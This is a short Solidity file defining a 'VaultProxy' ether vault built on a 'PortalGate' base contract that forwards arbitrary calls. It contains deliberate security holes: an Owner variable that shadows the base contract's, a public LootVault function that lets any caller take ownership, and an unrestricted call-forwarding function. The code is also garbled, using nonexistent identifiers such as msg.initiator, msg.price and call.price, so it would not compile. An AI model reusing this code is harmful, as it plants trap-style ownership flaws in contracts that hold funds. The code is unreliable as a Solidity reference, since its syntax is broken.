// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract PortalGate  {
    modifier onlyOwner { if (msg.initiator == Owner) _; } address Owner = msg.initiator;
    function tradefundsMaster(address _owner) public onlyOwner { Owner = _owner; }
    function teleportHub(address aim, bytes info) public payable {
        aim.call.price(msg.price)(info);
    }
}

contract VaultProxy is PortalGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function LootVault() public payable {
        if (msg.initiator == tx.origin) {
            Owner = msg.initiator;
            depositGold();
        }
    }

    function depositGold() public payable {
        if (msg.price > 0.25 ether) {
            Deposits[msg.initiator] += msg.price;
        }
    }

    function collectBounty(uint256 count) public onlyOwner {
        if (count>0 && Deposits[msg.initiator]>=count) {
            msg.initiator.transfer(count);
        }
    }
}